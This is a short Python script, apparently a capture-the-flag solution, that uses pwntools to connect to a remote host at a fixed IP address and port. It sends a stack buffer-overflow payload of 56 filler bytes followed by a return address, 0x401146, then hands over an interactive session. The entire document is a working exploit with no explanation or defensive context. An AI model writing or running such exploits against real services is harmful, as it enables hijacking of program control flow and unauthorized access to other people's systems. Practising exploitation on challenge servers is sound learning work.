from pwn import *

r = remote('35.205.161.145', 49153)

payload = b'a'*56
payload += p64(0x401146)

r.sendline(payload)
r.interactive()

